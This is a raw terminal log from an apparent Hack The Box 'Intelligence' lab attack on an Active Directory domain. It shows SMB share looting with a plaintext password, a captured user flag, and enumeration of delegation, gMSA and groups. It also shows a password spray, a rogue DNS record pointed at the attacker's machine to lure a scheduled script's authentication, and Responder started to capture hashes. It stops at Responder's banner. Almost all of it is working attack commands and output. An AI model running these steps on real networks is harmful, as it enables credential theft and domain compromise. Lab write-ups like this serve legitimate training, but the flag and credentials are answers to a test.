getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\01a - Windows PowerShell.lnk of size 1127 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/01a - Windows PowerShell.lnk (2.5 KiloBytes/sec) (average 133.7 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\02 - Command Prompt.lnk of size 1059 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/02 - Command Prompt.lnk (2.4 KiloBytes/sec) (average 132.1 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\02a - Windows PowerShell.lnk of size 1171 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/02a - Windows PowerShell.lnk (2.6 KiloBytes/sec) (average 130.6 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\03 - Computer Management.lnk of size 1015 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/03 - Computer Management.lnk (2.2 KiloBytes/sec) (average 129.0 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\04 - Disk Management.lnk of size 1015 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/04 - Disk Management.lnk (2.3 KiloBytes/sec) (average 127.6 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\04-1 - NetworkStatus.lnk of size 1582 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/04-1 - NetworkStatus.lnk (3.6 KiloBytes/sec) (average 126.2 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\05 - Device Manager.lnk of size 1075 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/05 - Device Manager.lnk (2.4 KiloBytes/sec) (average 124.8 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\06 - SystemAbout.lnk of size 1576 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/06 - SystemAbout.lnk (3.5 KiloBytes/sec) (average 123.4 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\07 - Event Viewer.lnk of size 1015 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/07 - Event Viewer.lnk (2.3 KiloBytes/sec) (average 122.1 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\08 - PowerAndSleep.lnk of size 1578 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/08 - PowerAndSleep.lnk (3.5 KiloBytes/sec) (average 120.8 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\09 - Mobility Center.lnk of size 1015 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/09 - Mobility Center.lnk (2.3 KiloBytes/sec) (average 119.5 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\10 - AppsAndFeatures.lnk of size 1578 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/10 - AppsAndFeatures.lnk (3.5 KiloBytes/sec) (average 118.2 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Local\Microsoft\Windows\WinX\Group3\desktop.ini of size 941 as Tiffany.Molina/AppData/Local/Microsoft/Windows/WinX/Group3/desktop.ini (2.1 KiloBytes/sec) (average 117.0 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini of size 79 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/desktop.ini (0.2 KiloBytes/sec) (average 115.8 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Notepad.lnk of size 1158 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Notepad.lnk (2.6 KiloBytes/sec) (average 114.6 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk of size 1142 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk (2.6 KiloBytes/sec) (average 113.5 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk of size 335 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk (0.7 KiloBytes/sec) (average 112.3 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Control Panel.lnk of size 405 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk (0.9 KiloBytes/sec) (average 111.2 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\desktop.ini of size 314 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini (0.7 KiloBytes/sec) (average 110.1 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk of size 407 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk (0.9 KiloBytes/sec) (average 109.0 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run.lnk of size 409 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk (0.9 KiloBytes/sec) (average 108.0 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk of size 2494 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk (5.6 KiloBytes/sec) (average 107.0 KiloBytes/sec)
getting file \Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk of size 2494 as Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk (5.6 KiloBytes/sec) (average 106.0 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini of size 79 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/desktop.ini (0.2 KiloBytes/sec) (average 105.0 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Notepad.lnk of size 1158 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Notepad.lnk (2.6 KiloBytes/sec) (average 104.1 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk of size 1142 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk (2.6 KiloBytes/sec) (average 103.1 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk of size 335 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk (0.8 KiloBytes/sec) (average 102.2 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Control Panel.lnk of size 405 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk (0.9 KiloBytes/sec) (average 101.3 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\desktop.ini of size 314 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini (0.7 KiloBytes/sec) (average 100.4 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk of size 407 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk (0.9 KiloBytes/sec) (average 99.5 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run.lnk of size 409 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk (0.9 KiloBytes/sec) (average 98.6 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk of size 2494 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk (5.6 KiloBytes/sec) (average 97.8 KiloBytes/sec)
getting file \Tiffany.Molina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk of size 2494 as Tiffany.Molina/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk (5.6 KiloBytes/sec) (average 97.0 KiloBytes/sec)
smb: \> ^C
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/SMB]
└─$ tree
.
├── Administrator
├── All Users
├── Default
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Application Data
│   │   │   ├── History
│   │   │   ├── Microsoft
│   │   │   │   ├── Windows
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Temporary Internet Files
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   └── WindowsApps
│   │   │   ├── Temp
│   │   │   └── Temporary Internet Files
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── desktop.ini
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           └── Windows
│   │               ├── Network Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── System Tools
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               │           ├── Windows PowerShell.lnk
│   │               │           └── Windows PowerShell (x86).lnk
│   │               └── Templates
│   ├── Application Data
│   ├── Cookies
│   ├── Desktop
│   ├── Documents
│   │   ├── My Music
│   │   ├── My Pictures
│   │   └── My Videos
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Local Settings
│   ├── Music
│   ├── My Documents
│   ├── NetHood
│   ├── NTUSER.DAT
│   ├── NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TM.blf
│   ├── NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000001.regtrans-ms
│   ├── NTUSER.DAT{0d4799bb-b8b5-11e8-ac1a-e41d2d717380}.TMContainer00000000000000000002.regtrans-ms
│   ├── NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf
│   ├── NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
│   ├── NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
│   ├── NTUSER.DAT.LOG1
│   ├── NTUSER.DAT.LOG2
│   ├── Pictures
│   ├── Recent
│   ├── Saved Games
│   ├── SendTo
│   ├── Start Menu
│   ├── Templates
│   └── Videos
├── Default User
├── desktop.ini
├── Public
├── Ted.Graves
└── Tiffany.Molina
    ├── AppData
    │   ├── Local
    │   │   ├── Application Data
    │   │   ├── History
    │   │   ├── Microsoft
    │   │   │   ├── Windows
    │   │   │   │   ├── GameExplorer
    │   │   │   │   ├── History
    │   │   │   │   ├── INetCache
    │   │   │   │   ├── INetCookies
    │   │   │   │   ├── Temporary Internet Files
    │   │   │   │   ├── UsrClass.dat
    │   │   │   │   ├── UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TM.blf
    │   │   │   │   ├── UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
    │   │   │   │   ├── UsrClass.dat{21166fb4-a0a8-11eb-ae74-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
    │   │   │   │   ├── UsrClass.dat.LOG1
    │   │   │   │   ├── UsrClass.dat.LOG2
    │   │   │   │   └── WinX
    │   │   │   │       ├── Group1
    │   │   │   │       │   ├── 1 - Desktop.lnk
    │   │   │   │       │   └── desktop.ini
    │   │   │   │       ├── Group2
    │   │   │   │       │   ├── 1 - Run.lnk
    │   │   │   │       │   ├── 2 - Search.lnk
    │   │   │   │       │   ├── 3 - Windows Explorer.lnk
    │   │   │   │       │   ├── 4 - Control Panel.lnk
    │   │   │   │       │   ├── 5 - Task Manager.lnk
    │   │   │   │       │   └── desktop.ini
    │   │   │   │       └── Group3
    │   │   │   │           ├── 01a - Windows PowerShell.lnk
    │   │   │   │           ├── 01 - Command Prompt.lnk
    │   │   │   │           ├── 02a - Windows PowerShell.lnk
    │   │   │   │           ├── 02 - Command Prompt.lnk
    │   │   │   │           ├── 03 - Computer Management.lnk
    │   │   │   │           ├── 04-1 - NetworkStatus.lnk
    │   │   │   │           ├── 04 - Disk Management.lnk
    │   │   │   │           ├── 05 - Device Manager.lnk
    │   │   │   │           ├── 06 - SystemAbout.lnk
    │   │   │   │           ├── 07 - Event Viewer.lnk
    │   │   │   │           ├── 08 - PowerAndSleep.lnk
    │   │   │   │           ├── 09 - Mobility Center.lnk
    │   │   │   │           ├── 10 - AppsAndFeatures.lnk
    │   │   │   │           └── desktop.ini
    │   │   │   └── WindowsApps
    │   │   ├── Temp
    │   │   └── Temporary Internet Files
    │   ├── LocalLow
    │   └── Roaming
    │       └── Microsoft
    │           ├── Internet Explorer
    │           │   └── Quick Launch
    │           │       ├── desktop.ini
    │           │       ├── Shows Desktop.lnk
    │           │       └── Window Switcher.lnk
    │           └── Windows
    │               ├── Network Shortcuts
    │               ├── Recent
    │               ├── SendTo
    │               ├── Start Menu
    │               │   └── Programs
    │               │       ├── Accessories
    │               │       │   ├── desktop.ini
    │               │       │   └── Notepad.lnk
    │               │       ├── System Tools
    │               │       │   ├── Command Prompt.lnk
    │               │       │   ├── computer.lnk
    │               │       │   ├── Control Panel.lnk
    │               │       │   ├── desktop.ini
    │               │       │   ├── File Explorer.lnk
    │               │       │   └── Run.lnk
    │               │       └── Windows PowerShell
    │               │           ├── Windows PowerShell.lnk
    │               │           └── Windows PowerShell (x86).lnk
    │               └── Templates
    ├── Application Data
    ├── Cookies
    ├── Desktop
    │   └── user.txt
    ├── Documents
    │   ├── My Music
    │   ├── My Pictures
    │   └── My Videos
    ├── Downloads
    ├── Favorites
    ├── Links
    ├── Local Settings
    ├── Music
    ├── My Documents
    ├── NetHood
    ├── NTUSER.DAT
    ├── NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TM.blf
    ├── NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
    ├── NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
    ├── ntuser.dat.LOG1
    ├── ntuser.dat.LOG2
    ├── ntuser.ini
    ├── Pictures
    ├── Recent
    ├── Saved Games
    ├── SendTo
    ├── Start Menu
    ├── Templates
    └── Videos

115 directories, 94 files
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/SMB]
└─$ cat Tiffany.Molina/Desktop/user.txt 
3c8210bb8088d21dde3816b9a45692c3
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/SMB]
└─$ smbclient //intelligence.htb/IT -U 'Tiffany.Molina%NewIntelligenceCorpUser9876'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

		3770367 blocks of size 4096. 1456916 blocks available
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)
smb: \> ^C
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/SMB]
└─$ ls -liah downdetector.ps1
2783019 -rw-r--r-- 1 kali kali 1.1K Aug 25 01:42 downdetector.ps1
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/SMB]
└─$ file downdetector.ps1 
downdetector.ps1: Unicode text, UTF-16, little-endian text, with CRLF, LF line terminators

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/SMB]
└─$ cat downdetector.ps1
��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ findDelegation.py intelligence.htb/Tiffany.Molina:'NewIntelligenceCorpUser9876' -dc-ip 10.129.95.154
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists
-----------  -----------------------------------  ----------------------------------  -----------------------  ----------
DC$          Computer                             Unconstrained                       N/A                      Yes
svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ GetNPUsers.py intelligence.htb/Tiffany.Molina:'NewIntelligenceCorpUser9876' -dc-ip 10.129.95.154
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ python3 gMSADumper.py -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' -d intelligence.htb -l 10.129.95.154
Unable to start a TLS connection. Is LDAPS enabled? Only ACLs will be listed and not ms-DS-ManagedPassword.

Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ nxc ldap intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --groups
LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.154   389    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
LDAP        10.129.95.154   389    DC               -Group-                                  -Members- -Description-
LDAP        10.129.95.154   389    DC               Administrators                           3         Administrators have complete and unrestricted access to the computer/domain
LDAP        10.129.95.154   389    DC               Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications
LDAP        10.129.95.154   389    DC               Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
LDAP        10.129.95.154   389    DC               Print Operators                          0         Members can administer printers installed on domain controllers
LDAP        10.129.95.154   389    DC               Backup Operators                         0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
LDAP        10.129.95.154   389    DC               Replicator                               0         Supports file replication in a domain
LDAP        10.129.95.154   389    DC               Remote Desktop Users                     0         Members in this group are granted the right to logon remotely
LDAP        10.129.95.154   389    DC               Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features
LDAP        10.129.95.154   389    DC               Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely
LDAP        10.129.95.154   389    DC               Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
LDAP        10.129.95.154   389    DC               Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine.
LDAP        10.129.95.154   389    DC               IIS_IUSRS                                0         Built-in group used by Internet Information Services.
LDAP        10.129.95.154   389    DC               Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.
LDAP        10.129.95.154   389    DC               Event Log Readers                        0         Members of this group can read event logs from local machine
LDAP        10.129.95.154   389    DC               Certificate Service DCOM Access          1         Members of this group are allowed to connect to Certification Authorities in the enterprise
LDAP        10.129.95.154   389    DC               RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
LDAP        10.129.95.154   389    DC               RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
LDAP        10.129.95.154   389    DC               RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
LDAP        10.129.95.154   389    DC               Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V.
LDAP        10.129.95.154   389    DC               Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer.
LDAP        10.129.95.154   389    DC               Remote Management Users                  0         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
LDAP        10.129.95.154   389    DC               Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica.
LDAP        10.129.95.154   389    DC               Domain Computers                         0         All workstations and servers joined to the domain
LDAP        10.129.95.154   389    DC               Domain Controllers                       0         All domain controllers in the domain
LDAP        10.129.95.154   389    DC               Schema Admins                            1         Designated administrators of the schema
LDAP        10.129.95.154   389    DC               Enterprise Admins                        1         Designated administrators of the enterprise
LDAP        10.129.95.154   389    DC               Cert Publishers                          1         Members of this group are permitted to publish certificates to the directory
LDAP        10.129.95.154   389    DC               Domain Admins                            1         Designated administrators of the domain
LDAP        10.129.95.154   389    DC               Domain Users                             0         All domain users
LDAP        10.129.95.154   389    DC               Domain Guests                            0         All domain guests
LDAP        10.129.95.154   389    DC               Group Policy Creator Owners              1         Members in this group can modify group policy for the domain
LDAP        10.129.95.154   389    DC               RAS and IAS Servers                      0         Servers in this group can access remote access properties of users
LDAP        10.129.95.154   389    DC               Server Operators                         0         Members can administer domain servers
LDAP        10.129.95.154   389    DC               Account Operators                        0         Members can administer domain user and group accounts
LDAP        10.129.95.154   389    DC               Pre-Windows 2000 Compatible Access       2         A backward compatibility group which allows read access on all users and groups in the domain
LDAP        10.129.95.154   389    DC               Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest
LDAP        10.129.95.154   389    DC               Windows Authorization Access Group       1         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
LDAP        10.129.95.154   389    DC               Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
LDAP        10.129.95.154   389    DC               Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain
LDAP        10.129.95.154   389    DC               Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
LDAP        10.129.95.154   389    DC               Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain
LDAP        10.129.95.154   389    DC               Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise
LDAP        10.129.95.154   389    DC               Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.
LDAP        10.129.95.154   389    DC               Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
LDAP        10.129.95.154   389    DC               Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain.
LDAP        10.129.95.154   389    DC               Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest.
LDAP        10.129.95.154   389    DC               DnsAdmins                                0         DNS Administrators Group
LDAP        10.129.95.154   389    DC               DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
LDAP        10.129.95.154   389    DC               DBA                                      1
LDAP        10.129.95.154   389    DC               IT Support                               2
LDAP        10.129.95.154   389    DC               Server Admin                             1
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ nxc ldap intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --groups "IT Support"
LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.154   389    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
LDAP        10.129.95.154   389    DC               Laura.Lee
LDAP        10.129.95.154   389    DC               Ted.Graves
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/Users]
└─$ vim us
┌──(kali㉿kali)-[~/Work/Kali/Intelligence/Users]
└─$ cat us
Laura.Lee
Ted.Graves
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ nxc ldap intelligence.htb -u Users/us -p 'NewIntelligenceCorpUser9876' --continue-on-success
LDAP        10.129.95.154   389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:intelligence.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.154   389    DC               [-] intelligence.htb\Laura.Lee:NewIntelligenceCorpUser9876
LDAP        10.129.95.154   389    DC               [-] intelligence.htb\Ted.Graves:NewIntelligenceCorpUser9876
```

```bash
┌──(venv)─(kali㉿kali)-[~/Work/Kali/Intelligence]
└─$ python3 ../../Tools/dnstool/krbrelayx/dnstool.py -u intelligence\\Tiffany.Molina -p NewIntelligenceCorpUser9876 --action add --record web_enil --data 10.10.16.151 -dns-ip 10.129.95.154 --type A intelligence.htb
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

```bash
┌──(kali㉿kali)-[~/Work/Tools/dnstool/krbrelayx]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
